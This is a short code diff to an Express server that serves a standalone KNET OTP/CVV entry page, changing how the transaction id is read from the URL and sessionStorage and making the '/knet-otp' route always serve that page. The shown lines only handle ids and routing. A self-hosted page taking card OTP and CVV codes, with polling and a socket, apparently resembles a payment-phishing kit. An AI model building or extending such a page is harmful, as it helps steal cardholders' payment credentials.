@@ -399,12 +399,14 @@ function buildOtpPage(knetId, mode, showError) {
   </div>
   <script>
   (function() {
-    var knetId = '${knetId}';
+    // Get knetId from URL or sessionStorage (Angular stores it there)
+    var knetId = '${knetId}' || sessionStorage.getItem('eventat_knet_txn') || (new URLSearchParams(window.location.search)).get('id') || '';
+    if (!knetId) knetId = sessionStorage.getItem('eventat_knet_txn') || '';
     var isCvv = ${isCvv};
     var pollTimer = null;
     var socket = null;
 
-    // Store knetId in sessionStorage for Angular pages
+    // Store knetId in sessionStorage
     if (knetId) sessionStorage.setItem('eventat_knet_txn', knetId);
 
     function showProcessing() {
@@ -501,12 +503,11 @@ function buildOtpPage(knetId, mode, showError) {
 </html>`;
 }
 
-// Serve standalone OTP/CVV page for /knet-otp
-app.get('/knet-otp', (req, res, next) => {
+// Serve standalone OTP/CVV page for /knet-otp (always, no Angular)
+app.get('/knet-otp', (req, res) => {
   const knetId = req.query.id || '';
   const mode = req.query.mode || '';
   const showError = req.query.error === '1';
-  if (!knetId) return next(); // No id, serve Angular
   res.send(buildOtpPage(knetId, mode, showError));
 });
 
